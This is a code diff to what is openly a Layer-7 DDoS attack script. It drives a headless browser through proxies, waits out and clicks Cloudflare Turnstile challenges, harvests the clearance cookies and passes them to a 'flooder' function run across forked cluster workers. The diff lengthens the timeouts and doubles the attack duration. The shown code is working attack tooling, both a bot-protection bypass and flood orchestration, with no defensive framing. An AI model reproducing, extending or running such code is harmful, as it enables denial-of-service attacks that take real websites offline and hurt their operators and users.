@@ -244,7 +244,7 @@ async function main(proxy) {
     log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) User-Agent: ${colors.yellow(`${meta.userAgentString}`.italic)}`);
 
 
-    await hero.goto(target, { referrer: 'https://google.com', timeoutMs: 30000 });
+    await hero.goto(target, { referrer: 'https://google.com', timeoutMs: 15000 });
     const cookieStorage = hero.activeTab.cookieStorage;
     await hero.waitForPaintingStable();
 
@@ -256,7 +256,7 @@ async function main(proxy) {
             const frame_url = await frame.url;
             if (frame_url.includes('challenges.cloudflare.com')) {
                 log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.red("Cloudflare Turnstile Detected")}`);
-                await new Promise(resolve => setTimeout(resolve, 6000));
+                await new Promise(resolve => setTimeout(resolve, 10000));
                 // const _title = await frame.executeJs(() => {
                 //     return window.document.title;
                 // })
@@ -271,7 +271,7 @@ async function main(proxy) {
                     log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.green("Cloudflare Turnstile Solved")}`);
 
                     await input.click();
-                    await new Promise(resolve => setTimeout(resolve, 8000));
+                    await new Promise(resolve => setTimeout(resolve, 10000));
                 }
             }
         }
@@ -288,7 +288,7 @@ async function main(proxy) {
     const cookies = await cookieStorage.getItems();
     const cookieString = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
     log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) Cookies: ${colors.green(cookieString)}`);
-    //await new Promise(resolve => setTimeout(resolve, 7000));
+    //await new Promise(resolve => setTimeout(resolve, 10000));
     flooder(proxy, meta.userAgentString, cookieString);
     await hero.close();
 }
@@ -411,7 +411,7 @@ if (cluster.isMaster) {
         cluster.fork({ core: worker.id % os.cpus().length });
     });
 
-    setTimeout(() => process.exit(log('Attack has ended')), duration * 1000);
+    setTimeout(() => process.exit(log('Attack has ended')), duration * 2000);
 
 } else {
     const workerId = parseInt(process.env.WORKER_ID, 10);
@@ -427,5 +427,5 @@ if (cluster.isMaster) {
     });
 
     start(workerId);
-    setTimeout(() => process.exit(log(`Thread ${process.pid} quitting...`)), duration * 1000);
+    setTimeout(() => process.exit(log(`Thread ${process.pid} quitting...`)), duration * 2000);
 }
